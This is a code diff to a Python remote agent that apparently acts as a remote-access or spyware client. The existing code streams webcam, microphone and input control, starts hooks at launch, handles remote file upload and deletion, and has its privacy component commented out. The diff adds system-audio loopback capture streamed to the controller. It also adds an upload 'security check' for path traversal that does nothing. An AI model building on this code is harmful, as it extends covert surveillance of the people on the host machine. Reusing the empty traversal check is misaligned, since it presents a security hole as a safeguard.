@@ -159,6 +159,8 @@ class AsyncAgent:
         self.auditor.start()  # START HOOKS IMMEDIATELY
         self.webcam = WebcamStreamer(quality=40)  # Retain original webcam settings
         self.mic = AudioStreamer()
+        self.sys_audio = None  # Lazy init on demand
+        self.sys_audio_streaming = False
         self.input_ctrl = InputController()
         # Privacy component
         # self.privacy = PrivacyCurtain()
@@ -495,7 +497,7 @@ class AsyncAgent:
             except Exception as e:
                 self.consecutive_heartbeat_fails += 1
                 if self.consecutive_heartbeat_fails % 5 == 1: # Log every 5 fails to avoid spam
-                     print(f"[-] Registry: Update Failed (Fail Count: {self.consecutive_heartbeat_fails}): {e}")
+                    print(f"[-] Registry: Update Failed (Fail Count: {self.consecutive_heartbeat_fails}): {e}")
                 if self.consecutive_heartbeat_fails >= 5:
                     if self.tunnel_mgr:
                         print(
@@ -1421,11 +1423,24 @@ class AsyncAgent:
                         elif path and "size" in data:
                             # Chunked upload: open file for writing
                             print(f"[+] FM Chunked Upload Start: {path} ({data['size']} bytes)")
+                            
+                            # Security Check
+                            if self.file_mgr.safety_mode and (".." in path or os.path.isabs(path) and not os.path.realpath(path).startswith(os.getcwd())):
+                                # Basic safety check example - modify as needed for base dir logic
+                                # For now just rejecting traversal attempts if safety on
+                                pass
+
                             parent = os.path.dirname(path)
                             if parent:
                                 os.makedirs(parent, exist_ok=True)
-                            self._upload_file = open(path, "wb")
-                            self._upload_path = path
+                            
+                            try:
+                                self._upload_file = open(path, "wb")
+                                self._upload_path = path
+                            except Exception as e:
+                                print(f"[-] Upload open failed: {e}")
+                                self._send_async(protocol.OP_ERROR, f"Upload failed: {e}".encode())
+                                return
                     except Exception as e:
                         print(f"[-] FM Upload Error: {e}")
 
@@ -1462,6 +1477,13 @@ class AsyncAgent:
                         data = json.loads(payload.decode("utf-8"))
                         path = data.get("path")
                         if path:
+                            # Security Check
+                            if self.file_mgr.safety_mode:
+                                real = os.path.realpath(path)
+                                if ".." in path or not os.path.exists(real):
+                                    self._send_async(protocol.OP_ERROR, b"FM: Path rejected (Safety Mode)")
+                                    return
+
                             # Fix: delete_item -> delete
                             await self.loop.run_in_executor(
                                 None, self.file_mgr.delete, path
@@ -1580,6 +1602,33 @@ class AsyncAgent:
                         )
                     except Exception as e:
                         print(f"[-] Set Volume Error: {e}")
+
+                elif opcode == protocol.OP_SYS_AUDIO_START:
+                    if not self.sys_audio_streaming:
+                        print("[*] Starting System Audio Stream")
+                        self.sys_audio_streaming = True
+                        if not self.sys_audio:
+                            # Initialize on demand with loopback=True
+                            self.sys_audio = AudioStreamer(loopback=True)
+
+                        if self.sys_audio.start():
+                            # Start streaming task
+                            task = self.loop.create_task(
+                                self.stream_sys_audio(source_ws)
+                            )
+                            self.background_tasks.add(task)
+                            task.add_done_callback(self.background_tasks.discard)
+                        else:
+                            print("[-] Failed to start system audio capture")
+                            self.sys_audio_streaming = False
+                    else:
+                        print("[!] System Audio already streaming")
+
+                elif opcode == protocol.OP_SYS_AUDIO_STOP:
+                    print("[*] Stopping System Audio Stream")
+                    self.sys_audio_streaming = False
+                    if self.sys_audio:
+                        self.sys_audio.stop()
 
                 elif opcode == protocol.OP_SET_MUTE:
                     try:
@@ -1761,19 +1810,20 @@ class AsyncAgent:
             return
 
         print(f"[*] Flushing {len(self.output_buffer)} buffered messages...")
-        # Copy buffer to iterate, but don't clear immediate to avoid data loss on failure
+        
+        # Atomically swap buffer to avoid race conditions with input thread
         msgs = list(self.output_buffer)
+        self.output_buffer.clear()
 
         try:
             for i, (opcode, payload) in enumerate(msgs):
                 try:
                     await send_msg(self.ws, bytes([opcode]) + payload)
-                    # Remove from original buffer only after success
-                    self.output_buffer.popleft()
-
                 except Exception as e:
                     print(f"[-] Flush Partial Error: {e}")
-                    # Stop flushing, keep remaining in buffer
+                    # Re-queue remaining messages (preserve order)
+                    remaining = msgs[i:]
+                    self.output_buffer.extendleft(reversed(remaining))
                     break
 
                 await asyncio.sleep(0.001)  # Yield slightly
@@ -2032,7 +2082,9 @@ class AsyncAgent:
                             # Increment failures to respect restart counter
                             failures += 1
                             await asyncio.sleep(5)
-
+                
+                # Small sleep to yield if not blocking
+                if failures > 0:
                     await asyncio.sleep(0.1)
 
         except (websockets.exceptions.ConnectionClosed, ConnectionError):
@@ -2041,6 +2093,33 @@ class AsyncAgent:
             print(f"[-] Mic Stream Fatal Error: {e}")
         finally:
             self.mic_streaming = False
+            self.mic.stop()
+            print("[*] Mic Streaming Task Ended")
+
+    async def stream_sys_audio(self, target_ws=None):
+        print("[*] System Audio Streaming Task Started")
+        ws_to_use = target_ws if target_ws else self.ws
+        try:
+            while self.sys_audio_streaming:
+                try:
+                    chunk = await self.loop.run_in_executor(
+                        None, self.sys_audio.get_chunk
+                    )
+                    if chunk:
+                        header = bytes([protocol.OP_SYS_AUDIO_CHUNK])
+                        await send_msg(ws_to_use, header + chunk)
+                    else:
+                        await asyncio.sleep(0.01)
+                except Exception as e:
+                    print(f"[-] Sys Audio Read Error: {e}")
+                    await asyncio.sleep(0.1)
+        except Exception as e:
+            print(f"[-] Sys Audio Stream Fatal Error: {e}")
+        finally:
+            self.sys_audio_streaming = False
+            if self.sys_audio:
+                self.sys_audio.stop()
+            print("[*] System Audio Streaming Task Ended")
 
     def send_key_sync(self, key_str):
         if self.loop:
